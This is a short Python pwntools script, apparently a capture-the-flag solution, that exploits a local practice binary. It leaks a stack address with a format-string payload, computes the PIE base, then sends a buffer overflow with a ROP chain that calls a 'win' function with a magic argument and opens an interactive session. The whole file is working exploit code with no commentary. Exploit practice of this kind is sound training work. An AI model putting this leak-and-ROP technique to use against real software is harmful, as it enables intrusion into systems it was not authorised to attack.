from pwn import *
from pwn import p64

context.log_level = "ERROR"

pros = process("../Binaries/bin")
elf = ELF("../Binaries/bin")
rop = ROP("../Binaries/bin")

pros.recvline()

payload = b"%49$p"
pros.sendline(payload)
addr = int(pros.recvline().strip(), 16)
bin_base_addr = addr - elf.symbols["_start"]

payload = b"A" * 0x68
payload += p64(bin_base_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(0xDEADBEEFCAFEBABE)
payload += p64(bin_base_addr + elf.symbols["win"])

pros.sendline(payload)
pros.interactive()
